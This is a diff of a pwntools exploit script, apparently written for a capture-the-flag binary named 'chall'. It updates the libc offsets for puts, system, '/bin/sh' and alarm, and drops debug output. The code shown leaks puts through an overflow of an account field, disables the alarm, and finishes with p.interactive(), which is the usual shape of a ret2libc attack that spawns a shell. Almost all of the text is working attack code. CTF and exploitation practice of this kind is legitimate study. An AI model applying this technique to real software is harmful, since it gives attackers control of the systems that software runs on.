@@ -1,15 +1,18 @@
 from pwn import *
 import re
 
+# chall offsets
 puts_plt = 0x000bf8
 puts_got = 0x202f40
 print_dec_offset = 0xe64
 
-puts_offset = 0x6a3e0
-binsh_offset = 0x168ed3
-system_offset = 0x40db0
-alarm_offset = 0xbb190
+# libc offsets
+puts_offset = 0x6f690
+binsh_offset = 0x18c177
+system_offset = 0x45390
+alarm_offset = 0xcb650
 
+# base addresses
 binary_base = None
 libc_base = None
 
@@ -17,13 +20,13 @@ p = process(['./chall', 'test.db'])
 
 
 def send_msg(msg):
-    print(msg)
+    # print(msg)
     p.send(msg)
 
 
 def wait_for(msg):
     m = p.recvuntil(msg)
-    print(m)
+    # print(m)
     return m
 
 
@@ -146,6 +149,7 @@ edit_account(1, "a" * 103 + p64(puts_plt + binary_base)[:7])
 check_account(1)
 get_puts_addr()
 
+
 # disabling alarm
 
 create_account(4)
@@ -167,5 +171,3 @@ send_msg("2\n")
 wait_for(":")
 send_msg("4\n")
 p.interactive()
-
-wait_for("Exit.")
